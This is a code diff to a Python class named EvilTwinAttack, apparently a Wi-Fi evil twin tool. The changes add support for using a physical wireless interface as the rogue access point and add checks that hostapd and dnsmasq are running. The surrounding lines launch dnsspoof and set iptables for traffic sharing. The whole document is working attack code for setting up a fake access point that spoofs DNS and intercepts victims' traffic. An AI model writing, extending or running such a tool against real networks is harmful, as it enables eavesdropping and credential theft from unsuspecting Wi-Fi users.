@@ -7,6 +7,7 @@ Complete rewrite with all fixes:
 - Fixed AP selection prompts
 - Proper handshake detection
 - Fixed virtual AP creation
+- Added support for physical interfaces as AP source
 """
 
 import subprocess
@@ -741,31 +742,58 @@ class EvilTwinAttack:
         
         log_debug(f"Routing table: {table}")
         
-        # ========== FIXED: VIRTUAL AP CREATION ==========
+        # ========== FIXED: AP INTERFACE LOGIC ==========
         log_debug(f"AP Base: {self.config.ap_base}, AP Interface: {self.config.ap_interface}")
         
-        # Remove interface if it already exists (clean start)
-        self.run_command(f"iw dev {self.config.ap_interface} del 2>/dev/null")
-        time.sleep(1)
-        
-        # Create virtual AP from wlan0
-        log_info(f"Creating virtual AP interface {self.config.ap_interface} from wlan0...")
-        ret, _, _ = self.run_command(f"iw dev wlan0 interface add {self.config.ap_interface} type __ap")
-        if ret != 0:
-            log_error(f"Failed to create virtual interface {self.config.ap_interface}")
-            return False
-        
-        # Configure and bring up
-        self.run_command(f"ip addr flush {self.config.ap_interface}")
-        self.run_command(f"ip link set up dev {self.config.ap_interface}")
-        time.sleep(2)
-        
-        # Verify it's UP
-        ret, _, _ = self.run_command(f"ip link show {self.config.ap_interface} | grep -q 'state UP'")
-        if ret != 0:
-            log_error(f"Virtual AP interface {self.config.ap_interface} failed to come UP!")
-            return False
-        log_success(f"Virtual AP interface {self.config.ap_interface} is UP")
+        # Check if this is a virtual interface (base differs from interface)
+        if self.config.ap_base != self.config.ap_interface:
+            # Virtual interface - create from wlan0
+            log_info(f"Creating virtual AP interface {self.config.ap_interface} from {self.config.ap_base}...")
+            
+            # Remove if it already exists
+            self.run_command(f"iw dev {self.config.ap_interface} del 2>/dev/null")
+            time.sleep(1)
+            
+            # Create virtual AP
+            ret, _, _ = self.run_command(f"iw dev {self.config.ap_base} interface add {self.config.ap_interface} type __ap")
+            if ret != 0:
+                log_error(f"Failed to create virtual interface {self.config.ap_interface}")
+                return False
+            
+            # Configure and bring up
+            self.run_command(f"ip addr flush {self.config.ap_interface}")
+            self.run_command(f"ip link set up dev {self.config.ap_interface}")
+            time.sleep(2)
+            
+            # Verify it's UP
+            ret, _, _ = self.run_command(f"ip link show {self.config.ap_interface} | grep -q 'state UP'")
+            if ret != 0:
+                log_error(f"Virtual AP interface {self.config.ap_interface} failed to come UP!")
+                return False
+            log_success(f"Virtual AP interface {self.config.ap_interface} is UP")
+            
+        else:
+            # Physical interface - use it directly
+            log_info(f"Using existing interface {self.config.ap_interface} directly for AP")
+            
+            # Check if interface exists
+            ret, _, _ = self.run_command(f"ip link show {self.config.ap_interface}")
+            if ret != 0:
+                log_error(f"Interface {self.config.ap_interface} does not exist!")
+                return False
+            
+            # Set to AP mode
+            self.run_command(f"ip link set {self.config.ap_interface} down")
+            self.run_command(f"iw dev {self.config.ap_interface} set type __ap")
+            self.run_command(f"ip link set {self.config.ap_interface} up")
+            time.sleep(2)
+            
+            # Verify it's UP
+            ret, _, _ = self.run_command(f"ip link show {self.config.ap_interface} | grep -q 'state UP'")
+            if ret != 0:
+                log_error(f"AP interface {self.config.ap_interface} failed to come UP!")
+                return False
+            log_success(f"AP interface {self.config.ap_interface} is UP")
         
         # ========== IPTABLES ==========
         log_info("Adding iptables for internet sharing...")
@@ -796,7 +824,14 @@ class EvilTwinAttack:
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL
         )
-        time.sleep(5)
+        time.sleep(8)
+        
+        # Verify hostapd is running
+        ret, _, _ = self.run_command("pgrep -f hostapd")
+        if ret == 0:
+          log_success("hostapd is running")
+        else:
+          log_error("hostapd failed to start")
         
         # Dnsmasq - FIXED: use subprocess.Popen
         subprocess.Popen(
@@ -808,6 +843,13 @@ class EvilTwinAttack:
         )
         time.sleep(3)
         
+        # Verify hostapd is running
+        ret, _, _ = self.run_command("pgrep -f dnsmasq")
+        if ret == 0:
+          log_success("dnsmasq is running")
+        else:
+          log_error("dnsmasq failed to start")
+          
         # Dnsspoof - FIXED: use subprocess.Popen
         subprocess.Popen(
             f"dnsspoof -i {self.config.ap_interface} > /dev/null 2>&1",
@@ -961,12 +1003,12 @@ class EvilTwinAttack:
         if self.config.airodump_pid:
             self.run_command(f"kill {self.config.airodump_pid} 2>/dev/null")
         
-        # Remove virtual AP interface
+        # Remove virtual AP interface (only if it's virtual)
         if self.config.ap_interface and self.config.ap_base != self.config.ap_interface:
             log_info(f"Removing virtual AP interface {self.config.ap_interface}...")
             self.run_command(f"iw dev {self.config.ap_interface} del 2>/dev/null")
         
-        # Reset existing AP interface (only if we set it)
+        # Reset physical AP interface to managed mode (only if we set it to AP mode)
         if (self.config.ap_interface and self.config.ap_base == self.config.ap_interface 
             and self.config.ap_interface != self.config.mon_interface
             and not self.config.monitor_mode_already):
